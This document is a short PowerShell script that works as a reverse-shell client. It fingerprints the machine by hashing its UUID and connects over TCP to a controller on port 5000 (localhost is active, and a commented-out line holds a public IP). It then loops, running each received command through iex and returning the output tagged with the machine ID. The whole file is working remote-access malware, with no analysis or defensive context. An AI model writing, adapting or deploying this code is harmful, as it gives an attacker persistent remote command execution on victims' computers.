# Get UUID of the machine.
try {
	$uuid = [System.Text.Encoding]::UTF8.GetBytes((Get-WMIObject Win32_ComputerSystemProduct).UUID);
} catch [System.Management.Automation.CommandNotFoundException] {
	$uuid = 0;
}

# Calculate SHA-256 hash from UUID.
$hasher = [System.Security.Cryptography.HashAlgorithm]::Create("sha256");
$uuid = $hasher.ComputeHash($uuid);

# Preallocate byte array with zeroes? Max command length 65535 bytes?
[byte[]] $bytes = 0..65535 |% {0};

# Loop indefinitely until "exit" command is issued.
while (1) {

	# Attempt to establish connection to server. Retry every 3 seconds.
	try {
		#$client = New-Object System.Net.Sockets.TCPClient("145.24.222.156", 5000);
		$client = New-Object System.Net.Sockets.TCPClient("localhost", 5000);
	} catch { # Catch ConstructorInvokedThrowException..
		Start-Sleep -s 3;
		continue;
	}
	# Initialize byte stream.
	$stream = $client.GetStream();

	# Keep session established as long as "exit" command is issued.
	while (1) {
		# Read bytes from stream and encode to ASCII.
		$i = $stream.Read($bytes, 0, $bytes.Length);
		$cmd = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);

		# Retry in 2 seconds if there were nothing to read.
		if ($cmd -eq "") {
			Start-Sleep -s 2;
			continue;
		} elseif ($cmd -eq "exit") {
			exit 1;
		}

		# Run command, encode stdout as UTF-8.
		$out = [System.Text.Encoding]::UTF8.GetBytes((iex $cmd 2>&1 | Out-String));

		# Write output to stream prepended by UUID.
		$length = $uuid.Length + $out.Length;
		$stream.Write($uuid + $out, 0, $length);
		$stream.Flush();
	}

	$client.Close();
}
